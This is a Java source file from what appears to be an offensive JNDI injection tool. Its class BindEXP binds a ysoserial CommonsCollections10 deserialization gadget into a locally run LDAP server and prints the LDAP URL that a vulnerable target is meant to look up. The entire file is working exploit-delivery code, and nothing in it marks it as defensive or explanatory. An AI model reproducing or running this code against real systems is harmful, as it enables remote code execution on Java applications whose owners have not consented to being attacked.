package runnable;

import ysoserial.payloads.CommonsCollections10;

import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;

public class BindEXP implements Runnable {

    private Object exp;
    private String ldapLocalURL;
    private String ldapURL;

    public BindEXP(Object exp){
        this.exp = exp;
        this.ldapLocalURL = "ldap://" + "127.0.0.1" + ":" + RunLDAPServer.port + "/cn=exp,dc=ldap,dc=fuck";
        this.ldapURL = "ldap://" + RunLDAPServer.host + ":" + RunLDAPServer.port + "/cn=exp,dc=ldap,dc=fuck";
    }

    public static void bindEXP(Object exp){
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        new Thread(new BindEXP(exp)).start();
    }

    @Override
    public void run() {
        try {
            DirContext ctx = new InitialDirContext();
            ctx.rebind(this.ldapLocalURL, this.exp);
            System.out.println("[+] exp bound successfully.");
            System.out.println("[+] " + this.ldapURL);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
